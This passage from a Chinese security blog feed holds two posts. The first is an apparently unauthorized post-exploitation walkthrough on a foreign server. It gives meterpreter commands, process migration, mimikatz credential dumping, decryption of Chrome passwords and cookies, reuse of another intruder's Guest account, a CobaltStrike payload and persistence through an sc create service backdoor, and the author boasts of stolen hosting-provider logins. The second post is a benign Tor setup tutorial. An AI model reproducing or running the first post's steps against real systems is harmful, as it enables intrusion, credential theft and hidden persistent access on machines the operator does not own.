sessions。</p><pre><code class="msf">msf5 exploit(multi/handler) &gt; sessionsActive sessions===============  Id  Name  Type                     Information                            Connection  --  ----  ----                     -----------                            ----------  1         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ WIN 172.16.123.89:4444 -&gt; *.*.*.*:31308 (*.*.*.*)msf5 exploit(multi/handler) &gt; sessions 1[*] Starting interaction with 1...meterpreter &gt; getuidServer username: NT AUTHORITY\SYSTEM</code></pre><p>仍然是SYSTEM权限！所以目前就不需要提权了。</p><h4 id="进程迁移"><a href="#进程迁移" class="headerlink" title="进程迁移"></a>进程迁移</h4><p>将当前meterpreter进程绑定到系统上的其他常见进程，让管理员更难以发现。</p><pre><code class="msf">meterpreter &gt; getpidCurrent pid: 4652meterpreter &gt; psProcess List============ PID    PPID   Name                  Arch  Session  User                          Path ---    ----   ----                  ----  -------  ----                          ---- 0      0      [System Process] 4      0      System                x64   0 160    528    svchost.exe           x86   0        NT AUTHORITY\SYSTEM           C:\Windows\SysWOW64\svchost.exe 180    528    svchost.exe           x86   0        NT AUTHORITY\SYSTEM           C:\Windows\SysWOW64\svchost.exe 272    4      smss.exe              x64   0        NT AUTHORITY\SYSTEM           \SystemRoot\System32\smss.exe 368    360    csrss.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe 384    528    svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe 412    360    wininit.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\wininit.exe………………meterpreter &gt; migratepidmeterpreter &gt; migrate 412[*] Migrating from 4652 to 412...[*] Migrating completed successfully.</code></pre><h4 id="明文密码获取"><a href="#明文密码获取" class="headerlink" title="明文密码获取"></a>明文密码获取</h4><p>dump各个用户的hashes密码，并加载mimikatz模块。</p><p><img src="/" class="lazyload" data-src="https://i.loli.net/2020/05/09/UEtaqvFmNg3fQ5I.png"  alt="hashdump.png"></p><p>获取登录过的用户储存在内存里的明文密码。</p><p><img src="/" class="lazyload" data-src="https://i.loli.net/2020/05/09/C1NRMDPhcxTiIba.png"  alt="wdigest.png"></p><h4 id="后门"><a href="#后门" class="headerlink" title="后门"></a>后门</h4><p>原本打算使用MSF中的<code>metsvc</code>和<code>persistence</code>脚本，但是并不太稳定。</p><p>所以尝试添加一个后门用户。</p><ul><li>激活Guest用户</li><li>创建隐藏用户</li><li>影子账户</li></ul><p>所以先尝试激活Guest用户，但是让我没想到滴是，已经有人捷足先登了？</p><p>他已经激活了。并且密码设置的很简单，被我猜测出来了。</p><pre><code class="cmd">C:\&gt; net user guest用户名                 Guest全名                   注释                   供来宾访问计算机或访问域的内置帐户用户的注释             国家/地区代码          000 (系统默认值)帐户启用               Yes帐户到期               从不上次设置密码           2020/5/8 11:27:55密码到期               从不密码可更改             2020/5/8 11:27:55需要密码               No用户可以更改密码       No允许的工作站           All登录脚本               用户配置文件           主目录                 上次登录               2020/5/8 11:27:59可允许的登录小时数     All本地组成员             *Administrators       *Guests               全局组成员             *None                 命令成功完成。</code></pre><p>所以就索性登录进去了，通过桌面上的文件，发现他在尝试进行提权。然后打开了浏览器历史，发现都是他使用百度搜索提权相关文章。。。（一看水平就不咋滴！这是台境外主机，是可以直连Google的）</p><p>通过下线时间来看，他弄到了凌晨4、5点钟。</p><h3 id="凭证获取"><a href="#凭证获取" class="headerlink" title="凭证获取"></a>凭证获取</h3><p>前面通过MSF加载了mimikatz。而现在直接通过蚁剑上传一个mimikatz。然后使用CMD运行。</p><ol><li>开启日志记录和Debug功能：</li></ol><pre><code class="cmd">  .#####.   mimikatz 2.2.0 (x64) #18362 May  2 2020 16:23:51 .## ^ ##.  &quot;A La Vie, A L&#39;Amour&quot; - (oe.eo) ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com ) ## \ / ##       &gt; http://blog.gentilkiwi.com/mimikatz &#39;## v ##&#39;       Vincent LE TOUX             ( vincent.letoux@gmail.com )  &#39;#####&#39;        &gt; http://pingcastle.com / http://mysmartlogon.com   ***/mimikatz # logUsing &#39;mimikatz.log&#39; for logfile : OKmimikatz(commandline) # privilege::debugPrivilege &#39;20&#39; OK</code></pre><ol start="2"><li>列出所有可用的提供者的凭据：</li></ol><pre><code class="cmd">mimikatz(commandline) # sekurlsa::logonpasswords</code></pre><p><img src="/" class="lazyload" data-src="https://i.loli.net/2020/05/09/rdBVYT352mNGMAK.png"  alt="logonpass.png"></p><ol start="3"><li>列出 LM 和 NTLM 凭证数据</li></ol><pre><code class="cmd">mimikatz(commandline) # sekurlsa::msv</code></pre><p><img src="/" class="lazyload" data-src="https://i.loli.net/2020/05/09/D6iJYnAyIpd1qFm.png"  alt="msv.png"></p><ol start="4"><li>列出已缓存的主密钥（Masterkey）：</li></ol><pre><code class="cmd">mimikatz(commandline) # sekurlsa::dpapi</code></pre><p><img src="/" class="lazyload" data-src="https://i.loli.net/2020/05/09/2QvqKC8cnTXWlgd.png"  alt="dpapi.png"></p><ol start="5"><li>使用获取到的Masterkey来解密浏览器保存的密码：</li></ol><pre><code class="cmd">mimikatz # dpapi::chrome /in:&quot;C:\Users\Administrator\AppData\Local\Google\Chrome\User Data\Default\Login Data&quot; /masterkey:796544192e821da616c9409fce49c056c9fdadb40</code></pre><p><img src="/" class="lazyload" data-src="https://i.loli.net/2020/05/09/gLXDpUjnYT1ISNV.png"  alt="Chrome.png"></p><p>不过只解了一个网站的密码，但也算幸运滴！</p><p>让人意外的是这网站还是个VPS托管商，真是意外收获：</p><p> class="lazyload" data-src="https://i.loli.net/2020/05/09/pzv3dJxHweE2afC.png" <img src="/"></p><p><img src="/" class="lazyload" data-src="https://i.loli.net/2020/05/09/NHylqFKbRdCpVBs.png"  alt="details.png"></p><ol start="6"><li>还可以解Cookie：</li></ol><pre><code class="cmd">mimikatz # dpapi::chrome /in:&quot;C:\Users\Administrator\AppData\Local\Google\Chrome\User Data\Default\Cookies&quot; /masterkey:796544192e821da616c9409fce49c056c9fdadb40</code></pre><p><img src="/" class="lazyload" data-src="https://i.loli.net/2020/05/09/69jzZYkTFstJgGB.png"  alt="cookie.png"></p><h3 id="CobaltStrike"><a href="#CobaltStrike" class="headerlink" title="CobaltStrike"></a>CobaltStrike</h3><p>CobaltStrike已经成为后渗透、权限维持和内网渗透中，少不了的利器。</p><h4 id="会话连接"><a href="#会话连接" class="headerlink" title="会话连接"></a>会话连接</h4><ol><li>在VPS上装好Java环境后，才可以启动团队服务：</li></ol><pre><code class="bash">root@localhost:~/CobaltStrike4.0# ./teamserver *.*.*.* password</code></pre><ol start="2"><li>然后客户端连接TeamServer，先创建一个Listeners。HTTP HOST地址都是TeamServer的公网IP。</li></ol><p><img src="/" class="lazyload" data-src="https://i.loli.net/2020/05/09/elRFKiqs964WUjc.png"  alt="listener.png"></p><ol start="3"><li>再然后生成一个Windows木马，默认名为artifact.exe。</li></ol><p><img src="/" class="lazyload" data-src="https://i.loli.net/2020/05/09/wIOzJRmhCLAP9Es.png"  alt="payload.png"></p><ol start="4"><li>通过蚁剑传到服务器，并通过蚁剑Terminal执行此文件，CS客户端就会收到一个会话。</li></ol><p><img src="/" class="lazyload" data-src="https://i.loli.net/2020/05/09/6m1Cc7ADIUXa5KP.png"  alt="system.png"></p><h4 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h4><p>通过Service的方式。</p><ol><li>生成一个服务的可执行文件，并upload至服务器。</li></ol><p><img src="/" class="lazyload" data-src="https://i.loli.net/2020/05/09/qm5kOTAd4Y8hKgc.png"  alt="exe.png"></p><ol start="2"><li>通过CS beacon创建一个服务，指向此后门。并设为开机自启，启动服务。</li></ol><pre><code class="bash">beacon&gt; shell sc create &quot;CyberSecServer&quot; binpath= &quot;C:\Windows\System32\s3rv1ce.exe&quot;beacon&gt; shell sc description &quot;CyberSecServer&quot; &quot;Security Service&quot;beacon&gt; shell sc config &quot;CyberSecServer&quot; start= autobeacon&gt; shell net start &quot;CyberSecServer&quot;</code></pre><p><img src="/" class="lazyload" data-src="https://i.loli.net/2020/05/09/ToYgbBOzqNpkmyn.png"  alt="serauto.png"></p><ol start="3"><li>start后就会立马弹回一个会话，权限都是SYSTEM。并且开机自启动。</li></ol><p>权限维持的方式有多种，通过NC、Powershell开机自启动，或者创建服务自启动与注册表设置开机启动项等。</p><p>但无论哪种，最重要的就是免杀。</p><h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a><em>Reference</em></h3><p><a href="https://github.com/zrools/tools">通达OA匿名RCE ExP</a></p><p><a href="https://adsecurity.org/?page_id=1821">Unofficial Guide to Mimikatz &amp; Command Reference</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 后渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>优雅的使用 Tor 兼浅谈安全原理</title>
      <link href="2020/03/15/Easier-use-of-Tor-and-talkabout-security-principles/"/>
      <url>2020/03/15/Easier-use-of-Tor-and-talkabout-security-principles/</url>
      
        <content type="html"><![CDATA[<blockquote><p>使用 Tor 并不能完全地匿名，或者说只能在网络层面最大限度的匿名。</p><p>要想完全地匿名，仅仅只是网络层面当然是远远不够滴！</p><p>至少包括但不限于以下几个层面：</p><ul><li>硬件层面</li><li>系统层面</li><li>软件层面</li><li>网络层面</li><li>社会工程学层面</li></ul></blockquote> <span id="more"></span><p>而本文就网络层面，即平常上网的公网 IP 层面来探讨。</p><p>本文所要说的 Tor 是指 Tor Proxy，而非 Tor Browser；抛弃 Tor Browser 浏览器，如何更优雅地使用 Tor 的匿名网络代理？</p><p>当然使用其他浏览器可能会更危险，但是此文的重点是如何更简捷地使用 Tor 的那三重匿名代理以及浅谈 Tor 的工作原理；而非拿 Tor 的代理来浏览网页！</p><h2 id="0x00-澄清一点"><a href="#0x00-澄清一点" class="headerlink" title="0x00 澄清一点"></a>0x00 澄清一点</h2><p>许多人认为，Tor 的出现助长了网络犯罪者，各种暗网无约束地犯罪；</p><p>但是我认为这种想法是不全面滴！</p><p>首先 Tor 被设计成通过防止被各种人/组织/Gov 监控和审查来抵御人权和隐私，使用 Tor，任何人，包括记者、人权活动家、外交官以及商务人士，都能够在使用互联网的时候，不再担心 Gov 与企业的监控。并且 Tor 官方厌恶用 Tor 做坏事的人。</p><p>其次这样想想，如果 Tor 消失掉！</p><p>那些网络犯罪者/黑帽子是否会减少？我认为并不会，那些黑帽完全可能会变着花样继续做坏事，例如大肆入侵其他人/组织的PC/服务器来充作肉鸡/跳板机。这样一来，网络犯罪数量可能并不会减少。</p><p>相反地，那些真正需要使用 Tor 的人，例如人权活动者、记者、虐待后的幸存者们、专制政权统治下的民主人士以及其他用 Tor 做好事的人们，他们可没有入侵的本领，他们应该怎么办？</p><h2 id="0x01-Tor-匿名网络"><a href="#0x01-Tor-匿名网络" class="headerlink" title="0x01 Tor 匿名网络"></a>0x01 Tor 匿名网络</h2><blockquote><p>再次强调：仅仅使用 Tor 并不能完全匿名！甚至说，在网络层面也不能完全匿名！</p></blockquote><p>首先是操作系统，Windows 绝对不可行，更不可信；macOS 貌似也可以。但是对于安全，当然首选 Linux 系统；</p><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p><strong>Tor</strong> 是实现匿名通信的自由软件。其名源于”The Onion Router”（洋葱路由器）的英语缩写。用户可透过 Tor 接达由全球志愿者免费提供，包含7000+个中继的覆盖网络，从而达至隐藏用户真实地址、避免网络监控及流量分析的目的。</p><p>即当您的流量通过 Tor 网络时，您的流量会被中继和加密三次。 该网络由数千个志愿者运行的服务器组成，称为 Tor 中继。(Tor 的流量网速非常慢，拿它来看视频是非常不道德滴！)</p><p>在流量抵达目的地前，Tor 通过三台/层不同中继(Relay)服务器来传递。三层中每一层都附加了互相独立的加密；而且默认每隔10分钟，三个节点就会变化一次，重新构造一条传输线路。</p><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>首先先是安装 Tor 服务了：</p><pre><code class="bash">$ sudo apt install tor</code></pre><p>其他 Linux 发行版本各自换成自家的包管理器，另外不要装错包了，不是装 tor-browser 浏览器。</p><p>源码：<a href="https://gitweb.torproject.org/tor.git">https://gitweb.torproject.org/tor.git</a></p><p>Github：<a href="https://github.com/torproject/tor">https://github.com/torproject/tor</a></p><p>不过 GitHub这个仓库并不是 official 的。</p><h3 id="基本配置"><a href="#基本配置" class="headerlink" title="基本配置"></a>基本配置</h3><p>Tor 的主要配置文件就是 <code>/etc/tor/torrc</code>，由此配置文件来启动 <em>tor.service</em> 服务 。下面我来说明这个配置文件应该如何配置：</p><h4 id="ControlPort"><a href="#ControlPort" class="headerlink" title="ControlPort"></a>ControlPort</h4><p>通过 ControlPort 开放的9051端口，其他程序可以更改、监控和管理 Tor 节点、配置及服务，或者获取关于 Tor 网络状态和 Circuits 的状态。</p><pre><code class="bash">ControlPort 9051</code></pre><p>如果使用 Tor Browser，就没必要开启这个了。本来为了安全起见，这个也不应该被开启/设置滴！</p><p>但是由于使用的是 Tor Service，而非 Tor Browser；所以需要一个前端界面来管理 Tor 服务，等会会用到一个程序 NYX，也是 Tor 官方开发的。</p><h4 id="Tor-Cookie"><a href="#Tor-Cookie" class="headerlink" title="Tor Cookie"></a>Tor Cookie</h4><pre><code class="bash">CookieAuthentication 1CookieAuthFile /var/lib/tor/control_auth_cookieCookieAuthFileGroupReadable 1DataDirectoryGroupReadable 1</code></pre><p>使用 Cookie 认证，这个就是对 ControlPort 的访问将受到对 Tor Cookie 文件和数据目录的文件权限限制；并且设置了，在 Tor group 中的所以用户都可以访问 Tor Cookie 文件。</p><p>将当前用户添加到 Tor 组，并重新加载组设置：</p><pre><code class="bash">$ sudo usermod -a -G tor $USER$ newgrp tor</code></pre><p>重启服务：</p><pre><code class="bash">$ sudo systemctl restart tor</code></pre><p>测试访问 Cookie 文件：</p><pre><code class="bash">$ stat -c%a /var/lib/tor /var/lib/tor/control_auth_cookie750640</code></pre><p>配置控制密码：</p><pre><code class="bash">$ sudo set +o history $ sudo tor --hash-password T0R16:30BB592367F379ED60EE638DE436D43A5E99C582DE0D17CBB5003AC120$ sudo set -o history</code></pre><p>首先先取消所输命令的历史，然后我这里设置的密码是 <code>T0R</code>，回车就会返回一段 hash 密文。</p><p>然后将此 hash 添加到配置文件中：</p><pre><code class="bash">HashedControlPassword 16:30BB592367F379ED60EE638DE436D43A5E99C582DE0D17CBB5003AC120</code></pre><h4 id="ControlSocket"><a href="#ControlSocket" class="headerlink" title="ControlSocket"></a>ControlSocket</h4><p>某些程序可能需要访问 ControlSocket（例如 Unix Domain Socket）。</p><pre><code class="bash">ControlSocket /var/lib/tor/control_socketControlSocketsGroupWritable 1DataDirectoryGroupReadable 1CacheDirectoryGroupReadable 1</code></pre><p>再次添加用户到 Tor 组（有的发行版本，例如 Kali Linux 是 debian-tor），并重载：</p><pre><code class="bash">$ sudo usermod -a -G tor $USER$ newgrp tor</code></pre><p>再重启服务：</p><pre><code class="bash">$ sudo systemctl restart tor</code></pre><p>验证 ControlSocket 状态，应该返回750和660：</p><pre><code class="bash">$ stat -c%a /var/lib/tor /var/lib/tor/control_socket750660</code></pre><h4 id="测试-Tor-Control"><a href="#测试-Tor-Control" class="headerlink" title="测试 Tor Control"></a>测试 Tor Control</h4><p>使用 <code>nc</code> 先测试 ControlPort：</p><pre><code class="bash">$ echo -e &#39;PROTOCOLINFO\r\n&#39; | nc 127.0.0.1 9051250-PROTOCOLINFO 1250-AUTH METHODS=COOKIE,SAFECOOKIE,HASHEDPASSWORD COOKIEFILE=&quot;/var/lib/tor/control_auth_cookie&quot;250-VERSION Tor=&quot;0.4.2.6&quot;250 OK514 Authentication required.</code></pre><p>然后再使用 <code>socat</code> 测试 ControlSocket：</p><pre><code class="bash">$ echo -e &#39;PROTOCOLINFO\r\n&#39; | sudo -u $USER socat - UNIX-CLIENT:/var/lib/tor/control_socket250-PROTOCOLINFO 1250-AUTH METHODS=COOKIE,SAFECOOKIE,HASHEDPASSWORD COOKIEFILE=&quot;/var/lib/tor/control_auth_cookie&quot;250-VERSION Tor=&quot;0.4.2.6&quot;250 OK514 Authentication required.</code></pre><h3 id="进阶"><a href="#进阶" class="headerlink" title="进阶"></a>进阶</h3><h4 id="前置代理"><a href="#前置代理" class="headerlink" title="前置代理"></a>前置代理</h4><p>一般地都会在使用 Tor 时套一个前置代理，这样子做可以保护真正的公网 IP 不泄露给 Tor 的三个节点。</p><p>一般地就拿 shadowsocks 来举例，其代理协议和端口为 Socks5 和1080。</p><p>添加如下至  <code>torrc</code> 中：</p><pre><code class="bash">Socks5Proxy 127.0.0.1:1080</code></pre><h4 id="Pluggable-Transports"><a href="#Pluggable-Transports" class="headerlink" title="Pluggable Transports"></a>Pluggable Transports</h4><p>由于某些地区 ISP/Gov 会阻断直接 Tor 独立联网，所以 Tor 官方推出了一些方法。</p><p>即<strong>可插拔传输器</strong>，目前有三种：</p><ul><li><p>obfs4</p><p>obfs4 使 Tor 的流量看起来是随机的，并且还防止检查程序通过互联网扫描找到网桥。 与之前的 obfs3 网桥相比，obfs4 网桥被阻塞的可能性较小。</p></li><li><p>meek</p><p>meek 依赖的这几个云计算平台都是大公司（亚马逊、微软）提供的，使您看起来像在浏览主要网站，而不是使用 Tor。 meek-azure 使您看起来像在使用 Microsoft 网站。</p></li><li><p>snowflake</p><p>Snowflake 是对 Flashproxy 的改进。 它通过WebRTC发送您的流量，WebRTC 是一种具有内置网络地址转换穿透的对等（P2P）协议。</p></li></ul><p>就拿 obfs4 来说（其他两种方式可以自行摸索）：</p><p>首先得先安装 obfs4 client：</p><pre><code class="bash">$ sudo apt install obfs4proxy</code></pre><p>然后添加去 Tor <a href="https://bridges.torproject.org/bridges?lang=en">BridgeDB</a> 申请一个 Bridge；</p><p>并添加至配置文件中：</p><pre><code class="bash">UseBridges 1ClientTransportPlugin obfs4 exec /bin/obfs4proxyBridge obfs4 195.x.x.x:443 375C3E9451E93AF49DA654958EE2C348CDD0BC32 cert=mC7+A9QdsVrbU8t/wxTdoPYn4HXTeLMLR4cLqTvy78OSNfnJciIIaKlRdO43M8cdqFBmWw iat-mode=0Bridge obfs4 93.x.x.x:443 C14FE02FD5612975658413657C7B2F18371D17F1 cert=Csjph7dmFxf1pnLX2V+42WH3WZkvIgSlWLBZuOOsukqusOClRg9esphbBy30J/4t2OjeIQ iat-mode=0Bridge obfs4 185.2x.x4.x6:80 0C556DC0725775FE9C76C877A47009CFAAFDA688 cert=zG6an8OkE3tWuKrea5Q8Ju1suNiBbUuB/L2UeFt3iXRsn06IF3sdaD2M5fJKqJ7KdT7sGw iat-mode=0</code></pre><p>不要复制上面的 Bridges，因为并不能用。</p><h4 id="节点编辑"><a href="#节点编辑" class="headerlink" title="节点编辑"></a>节点编辑</h4><p>一些危险的国家/地区(相对来说)，所提供的节点很可能是蜜罐。</p><pre><code class="bash">ExcludeNodes &#123;cn&#125;,&#123;hk&#125;,&#123;mo&#125;,&#123;kp&#125;,&#123;ir&#125;,&#123;sy&#125;,&#123;pk&#125;,&#123;cu&#125;,&#123;vn&#125;,&#123;ru&#125;ExcludeExitNodes &#123;cn&#125;,&#123;hk&#125;,&#123;mo&#125;,&#123;sg&#125;,&#123;th&#125;,&#123;pk&#125;,&#123;by&#125;,&#123;ru&#125;,&#123;ir&#125;,&#123;vn&#125;,&#123;ph&#125;,&#123;my&#125;,&#123;cu&#125;StrictNodes 1</code></pre><p><code>ExcludeNodes</code> 即排除节点，把这些国家的节点从 Tor 链路上除掉；而 <code>ExcludeExitNodes</code> 是指排除<strong>出口节点</strong>，，即 Tor 的出口节点要排除括号中的几个国家的节点。<code>StricNodes</code> 是强制执行。</p><p>当然还可以指定出口节点：</p><pre><code class="bash">StrictExitNodes 1ExitNodes &#123;us&#125;</code></pre><p>但是其实是没必要的，视具体情况而定。</p><h3 id="前端界面"><a href="#前端界面" class="headerlink" title="前端界面"></a>前端界面</h3><h4 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h4><p>一切配置完毕后，就可以测试了！</p><pre><code class="bash">$ sudo systemctl restart tor$ sudo systemctl enable tor$ sudo systemctl status tor● tor.service - Anonymizing Overlay Network     Loaded: loaded (/usr/lib/systemd/system/tor.service; enabled; vendor preset: disabled)     Active: active (running) since Sun 2020-03-15 14:33:59 CST; 7s ago   Main PID: 8723 (tor)      Tasks: 12 (limit: 14213)     Memory: 23.0M     CGroup: /system.slice/tor.service             ├─8723 /usr/bin/tor -f /etc/tor/torrc             └─8728 /bin/obfs4proxyMar 15 14:33:59 4rch Tor[8723]: Delaying directory fetches: Pluggable transport proxies still configuringMar 15 14:34:00 4rch Tor[8723]: Bridge &#39;bitclcpriv5&#39; has both an IPv4 and an IPv6 address.  Will prefer &gt;Mar 15 14:34:01 4rch Tor[8723]: Bootstrapped 1% (conn_pt): Connecting to pluggable transportMar 15 14:34:01 4rch Tor[8723]: Bootstrapped 2% (conn_done_pt): Connected to pluggable transportMar 15 14:34:02 4rch Tor[8723]: Bootstrapped 10% (conn_done): Connected to a relayMar 15 14:34:02 4rch Tor[8723]: Bootstrapped 14% (handshake): Handshaking with a relayMar 15 14:34:03 4rch Tor[8723]: Bootstrapped 15% (handshake_done): Handshake with a relay doneMar 15 14:34:03 4rch Tor[8723]: Bootstrapped 75% (enough_dirinfo): Loaded enough directory info to build&gt;Mar 15 14:34:06 4rch Tor[8723]: Bridge &#39;bitclcpriv5&#39; has both an IPv4 and an IPv6 address.  Will prefer &gt;Mar 15 14:34:06 4rch Tor[8723]: Bootstrapped 95% (circuit_create): Establishing a Tor circuitMar 15 14:34:07 4rch Tor[8723]: Bridge &#39;bitclcpriv5&#39; has both an IPv4 and an IPv6 address.  Will prefer using its IPv4 address (195.135.………………Mar 15 14:34:08 4rch Tor[8723]: Bootstrapped 100% (done): Done</code></pre><p>Bootstrapped 到 100%时就成功了！</p><p>浏览器挂好代理就可以测试是否使用的是 Tor 网络，Tor 的代理类型是 Socks5，9050 端口。</p><p>测试网站：<a href="https://check.torproject.org/">https://check.torproject.org</a></p><h4 id="NYX"><a href="#NYX" class="headerlink" title="NYX"></a>NYX</h4><p>前面说了会使用一个 Tor 官方开发的程序来对 Tor 网络进行管理，即 Nyx。</p><p>很不错的一款软件，可以显示带宽、日志、连接路线，编辑配置文件，交互 shell 等等……</p><p>官网：<a href="https://nyx.torproject.org/">https://nyx.torproject.org</a></p><pre><code class="bash">$ sudo apt install nyx</code></pre><p>输入命令即可运行(Tor 服务必须运行成功才能使用)，需要最开始设置的密码(T0R)。</p><p>如下是上下行带宽：</p><pre><code class="bash">$ nyxnyx - de (Linux 4.5.9-debian1-2)           Tor 0.4.2.6 (recommended)Relaying Disabled, Control Port (password): 9051cpu: 0.0% tor, 1.5% nyx    mem: 37 MB (0.3%)   pid: 8951   uptime: 17:45page 1 / 5 - m: menu, p: pause, h: page help, q: quitBandwidth (limit: 1 GB/s, burst: 1 GB/s):Download (0.0 B/sec     - avg: 1.5 KB/sec, total: 1.5 MB):          Upload (0.0 B/sec     - avg: 409.1 B/sec, total: 425.9 KB):1 KB                                                                1 KB                                                                                                                                                              700 B                                                               714 B                                                                                                                                                             350 B                                                               357 B                                                                                                                                                                                         0 B                                                                 0 B                                                                         10s       20        30        40        50                          10s       20        30        40        50</code></pre><p>第二页是路线(Guard 是人口节点，Middle 中间节点，End 出口节点)：</p><pre><code class="bash">page 2 / 5 - m: menu, p: pause, h: page help, q: quitConnections (6 circuit, 1 control): 104.44.95.162          --&gt;  1.89.2.2:9001 (us)         Purpose: General, Circuit ID: 7                                20.2m (CIRCUIT)   │  192.168.0.1:0 (??)          0C556DC0720875FE9C76C877A47899CFAAFDA688  UNKNOWN                                          1 / Guard │  6.21.73.207:8008 (us)     B872BA6804C8C4E141AE1497B44CF32B82FD2397  UNKNOWN                                          2 / Middle └─ 5.39.72.2:9001 (fr)         2FFE5FAF70D20E76B0474AE9E40C2A0B53F8D9F0  Unkn0wn                                          3 / End 104.44.95.162          --&gt;  3.12.64.185:443 (fr)      Purpose: General, Circuit ID: 5                                20.2m (CIRCUIT) │  192.168.0.1:0 (??)          0C556DC0725775FE9C76C877A47009CFAAFDA688  UNKNOWN                                          1 / Guard │  184.27.85.34:9001 (fr)     5B3EC887418596BBE9A291C2A845A4EFF8AB05B8  UNKNOWN                                          2 / Middle └─ 230.129.64.115:443 (ca)      F4C836A27BF192F3464A67126E8EE2B19693AED1  UNKNOWN                                          3 / End 204.44.94.162          --&gt;  54.38.219.250:443 (fr)      Purpose: General, Circuit ID: 6                                20.2m (CIRCUIT) │  192.168.0.1:0 (??)          0C556DC0725775FE9C76C877A47009CFAAFDA688  UNKNOWN                                          1 / Guard │  61.21.83.27:8008 (fr)     B872BA6124C8C6E450AE1897B44CF32B42FD2397  UNKNOWN                                          2 / Middle └─ 55.34.219.25:443 (fr)      929BB84A64318CE35E2F2828812840AF5C2CBC4A  UNKNOWN                                          3 / End 204.44.94.162          --&gt;  116.202.112.170:443 (de)    Purpose: General, Circuit ID: 10                                9.0m (CIRCUIT) │  192.168.0.1:0 (??)          0C556DC0725775FE9C76C877A47009CFAAFDA688  UNKNOWN                                          1 / Guard │  56.38.134.34:443 (pl)      39C6F833D4B09524770D5675DF825A11293CA0A2  UNKNOWN                                          2 / Middle └─ 106.212.111.17:443 (de)    2A1353D8439453E9ED8F5C27F3459DFB01BF9523  UNKNOWN                                          3 / End 127.0.0.1:47554 (??)        --&gt;  204.44.94.162:9051     nyx (14125)                                                   +41.9s (CONTROL)</code></pre><p>等等……</p><h2 id="0x02-浅谈安全原理"><a href="#0x02-浅谈安全原理" class="headerlink" title="0x02 浅谈安全原理"></a>0x02 浅谈安全原理</h2><h3 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h3><p>当我们平常上网时，上的网站/APP 如果都是 HTTP 明文传输类型的，我称这种情况为<em>明文裸奔</em>。</p><p>那么此时，我们上网的数据包路线就是由自个电脑/手机发出，经过路由器或者直接到运营商ISP，最后到网站/服务器。这种场景下，从用户 Client 端直到网站 Server 端之间传输的数据均是明文。此时黑客攻击者、运营商/Gov 可以通过链路劫持，以及网站工作人员直接能看到：</p><ul><li><strong>你的公网 IP 位置（通常真实的公网IP泄露也就代表真实地理位置暴露）</strong></li><li><strong>你所访问的网站</strong></li><li><strong>在此网站输入的账号密码</strong></li><li><strong>以及你浏览此网站的明文页面数据</strong></li></ul><h3 id="HTTPS"><a href="#HTTPS" class="headerlink" title="HTTPS"></a>HTTPS</h3><p>当我们上的网站/APP 是 HTTPS，这种情况下：</p><p>黑客攻击者、运营商/Gov 可以看到：</p><ul><li><strong>你的公网 IP</strong></li><li><strong>你所访问的网站</strong></li><li><del>在此网站输入的账号密码</del></li><li><del>以及你浏览此网站的明文页面数据</del></li></ul><p>虽然是现在都是加密存储用户名密码，但是也要保持谨慎；所以，网站工作人员最坏的情况可以看到你的：</p><ul><li><strong>你的公网 IP</strong></li><li><strong>你所访问的网站</strong></li><li><strong>在此网站输入的账号密码</strong></li><li><strong>以及你浏览此网站的明文页面数据</strong></li></ul><h3 id="Tor"><a href="#Tor" class="headerlink" title="Tor"></a>Tor</h3><p>当仅仅只是使用了 Tor 网络，而访问了 HTTP 的服务器。</p><p>而此时数据经过的路线即：</p><p>首先由自个电脑/手机 Client 端发出；经过路由器或者直接到运营商ISP；</p><p>然后再到 Tor 网络的第一入口中继节点，第一节点解除第一层加密，但无法获悉网页请求指向的网站；</p><p>转而到中间节点，解除第二层加密，啥也不知道，将网页请求转发至下一节点；</p><p>接着到出口节点，解除最后一层加密，并将网页请求转发给目标服务器，但是无法获悉该请求来自哪个 IP。</p><p>再然后到第二个运营商，最后到网站服务器。</p><p>先说经过 Tor 网络入口节点前，攻击者/ISP/Gov 可以知晓：</p><ul><li><strong>你的公网 IP</strong></li><li><strong>以及知道你发出了 Tor 流量</strong></li></ul><p>然后流量到第一入口节点，其可以看到你的：</p><ul><li><strong>公网 IP</strong></li><li><strong>你发出了 Tor  流量</strong></li><li><del>你所访问的网站</del></li><li><del>在此网站输入的账号密码</del></li><li><del>以及你浏览此网站的明文页面数据</del></li></ul><p><strong>入口节点仅仅能看到你这个 IP 地址正在使用 Tor，但是它无法确定你的网络去向。</strong></p><p>第二中间节点只能接收第一节点的 Tor 流量。</p><p>第三出口节点看不到你的公网 IP，但可以知晓：</p><ul><li><del>你的公网 IP</del></li><li><strong>来自中间节点的 Tor 流量</strong></li><li><strong>将要访问的网站</strong></li><li><strong>传输的明文账户密码</strong></li><li><strong>以及明文数据</strong></li></ul><p>之后到达 ISP和网站，此时出口节点后的 ISP/Gov/攻击者/网站工作人员可以窥探：</p><ul><li><del>你的公网 IP</del></li><li><strong>来自出口节点的 Tor 流量</strong></li><li><strong>将要访问的网站</strong></li><li><strong>传输的明文账户密码</strong></li><li><strong>以及访问的明文页面数据</strong></li></ul><p>不过仍然看不到你的公网 IP。</p><p>但是要考虑，这些节点可能为蜜罐以及<strong>公司、Gov、攻击者、搭建蜜罐节点的志愿者之间的合作</strong>，所以仍然是很危险的！</p><h3 id="Tor-HTTPS"><a href="#Tor-HTTPS" class="headerlink" title="Tor + HTTPS"></a>Tor + HTTPS</h3><p>很显然这种方案比上面的要安全一点，但是仍然不太安全。</p><p>此时的数据路线和使用上面仅使用 Tor 一样。</p><p>所以，到达 Tor 网络第一入口节点(包括入口节点)，攻击者/ISP/Gov/入口节点可以知晓：</p><ul><li><strong>你的公网 IP</strong></li><li><strong>以及知道你发出了 Tor 流量</strong></li></ul><p>第二中间节点只接收到来自第一入口节点的 Tor 流量。</p><p>出口节点及出口节点后的 ISP/Gov/攻击者可以知晓：</p><ul><li><strong>前一节点发出的 Tor 